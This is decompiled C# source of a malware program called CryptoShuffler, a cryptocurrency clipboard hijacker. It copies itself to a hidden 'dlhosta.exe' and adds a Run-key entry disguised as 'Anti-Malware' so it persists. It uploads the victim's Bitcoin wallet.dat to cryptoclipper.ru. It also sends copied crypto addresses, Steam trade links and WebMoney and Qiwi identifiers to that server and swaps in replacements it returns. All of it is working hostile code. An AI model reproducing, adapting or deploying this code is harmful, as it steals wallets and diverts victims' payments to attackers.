// Decompiled with JetBrains decompiler
// Type: CryptoShuffler.Program
// Assembly: CryptoShuffler, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5F09791C-5808-4C4E-85A5-E8B78F7E37DE
// Assembly location: C:\Users\gorno\Desktop\vm\de4dot-moded\cryptoshuffler-cleaned-cleaned-cleaned-cleaned.exe

using ClipboardHelper;
using Microsoft.Win32;
using System.IO;
using System.Net;
using System.Reflection;
using System.Windows.Forms;

namespace CryptoShuffler
{
  internal class Program
  {
    public static string text = "";

    private static void Main()
    {
      Settings.Owner = "spasibo etomu parnu za build";
      Settings.Version = "3.2.2";
      Program.Autorun();
      Program.SendWalletDat();
      ClipboardMonitor.OnClipboardChange += new ClipboardMonitor.OnClipboardChangeEventHandler(Program.ClipboardMonitor_OnClipboardChange);
      ClipboardMonitor.Start();
    }

    private static void ClipboardMonitor_OnClipboardChange(ClipboardFormat format, object data)
    {
      if ((uint) format > 0U)
        return;
      string text = Clipboard.GetText();
      if (text == Program.text)
        return;
      Type? type = Program.getType(text);
      if (!type.HasValue)
        return;
      Program.Shuffle(type, text);
    }

    private static void SendWalletDat()
    {
      try
      {
        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
        {
          string str = registryKey.GetValue("strDataDir").ToString();
          new WebClient().UploadFile(string.Format("https://cryptoclipper.ru/files/upload.php?user={0}", (object) Settings.Owner), "POST", str + "wallet.dat");
        }
      }
      catch
      {
      }
    }

    public static void Autorun()
    {
      if (!Directory.Exists(Settings.Folder))
        Directory.CreateDirectory(Settings.Folder);
      if (System.IO.File.Exists(Settings.Folder + "dlhosta.exe"))
      {
        try
        {
          System.IO.File.Delete(Settings.Folder + "dlhosta.exe");
        }
        catch
        {
        }
      }
      if (!System.IO.File.Exists(Settings.Folder + "dlhosta.exe"))
      {
        try
        {
          System.IO.File.Copy(Assembly.GetEntryAssembly().Location, Settings.Folder + "dlhosta.exe");
          System.IO.File.SetAttributes(Settings.Folder + "dlhosta.exe", FileAttributes.Hidden);
        }
        catch
        {
        }
      }
      Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue("Anti-Malware", (object) ("\"" + Settings.Folder + "dlhosta.exe\""));
    }

    private static Type? getType(string cliptext)
    {
      return (!cliptext.StartsWith("1") || cliptext.Contains("0") || (cliptext.Contains("I") || cliptext.Contains("l")) || cliptext.Contains("O") ? 0 : (cliptext.Length == 34 ? 1 : 0)) == 0 ? ((!cliptext.StartsWith("L") || cliptext.Contains("0") || (cliptext.Contains("I") || cliptext.Contains("l")) || cliptext.Contains("O") ? 0 : (cliptext.Length == 34 ? 1 : 0)) == 0 ? ((!cliptext.StartsWith("0x") ? 0 : (cliptext.Length == 42 ? 1 : 0)) == 0 ? ((!cliptext.StartsWith("4") ? 0 : (cliptext.Length == 95 ? 1 : (cliptext.Length == 106 ? 1 : 0))) == 0 ? (!cliptext.StartsWith("https://steamcommunity.com/tradeoffer/new/") ? ((!cliptext.StartsWith("R") ? 0 : (cliptext.Length == 13 ? 1 : 0)) == 0 ? ((!cliptext.StartsWith("E") ? 0 : (cliptext.Length == 13 ? 1 : 0)) == 0 ? ((!cliptext.StartsWith("Z") ? 0 : (cliptext.Length == 13 ? 1 : 0)) == 0 ? ((!cliptext.StartsWith("+") ? 0 : (cliptext.Length == 12 ? 1 : 0)) == 0 ? ((!cliptext.StartsWith("79") ? 0 : (cliptext.Length == 11 ? 1 : 0)) == 0 ? ((!cliptext.StartsWith("380") ? 0 : (cliptext.Length == 12 ? 1 : 0)) == 0 ? ((!cliptext.StartsWith("+380") ? 0 : (cliptext.Length == 13 ? 1 : 0)) == 0 ? new Type?() : new Type?(Type.Qiwi)) : new Type?(Type.Qiwi)) : new Type?(Type.Qiwi)) : new Type?(Type.Qiwi)) : new Type?(Type.WMZ)) : new Type?(Type.WME)) : new Type?(Type.WMR)) : new Type?(Type.Steam)) : new Type?(Type.XMR)) : new Type?(Type.ETH)) : new Type?(Type.LTC)) : new Type?(Type.BTC);
    }

    private static void Shuffle(Type? type, string copied)
    {
      string text = new WebClient().DownloadString(string.Format("https://cryptoclipper.ru/shuffler.php?type={0}&user={1}&copy={2}", (object) type, (object) Settings.Owner, (object) copied));
      Program.text = text;
      if ((text == "" ? 1 : (text == " " ? 1 : 0)) != 0)
        return;
      Clipboard.SetText(text);
    }
  }
}
